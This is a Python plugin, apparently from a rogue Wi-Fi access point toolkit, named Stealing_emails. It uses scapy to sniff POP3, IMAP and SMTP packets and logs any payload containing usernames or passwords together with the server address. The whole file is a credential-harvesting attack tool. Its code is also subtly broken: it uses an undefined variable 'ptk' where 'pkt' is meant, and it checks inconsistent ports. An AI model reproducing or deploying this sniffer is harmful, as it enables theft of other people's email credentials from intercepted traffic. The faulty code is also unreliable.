from scapy.all import *
from default import PSniffer

class Stealing_emails(PSniffer):
    ''' capture POP3,IMAP,SMTP '''
    _activated     = False
    _instance      = None
    meta = {
        'Name'      : 'emails',
        'Version'   : '1.0',
        'Description' : 'capture emails packets POP3,IMAP,SMTP ',
        'Author'    : 'Pumpkin-Dev',
    }
    def __init__(self):
        for key,value in self.meta.items():
            self.__dict__[key] = value

    @staticmethod
    def getInstance():
        if Stealing_emails._instance is None:
            Stealing_emails._instance = Stealing_emails()
        return Stealing_emails._instance

    def filterPackets(self,pkt):
        if pkt.haslayer(TCP) and pkt.haslayer(Raw) and pkt.haslayer(IP):
            self.dport = pkt[TCP].dport
            self.sport = pkt[TCP].sport
            if self.dport == 110 or self.sport == 25 or self.dport == 143:
                if ptk[TCP].payload:
                    email_pkt = str(ptk[TCP].payload)
                    if 'user' in email_pkt.lower() or 'pass' in email_pkt.lower():
                        self.logging.info('[*] Server {}'.format(pkt[IP].dst))
                        self.logging.info('[*] {}'.format(pkt[TCP].payload))
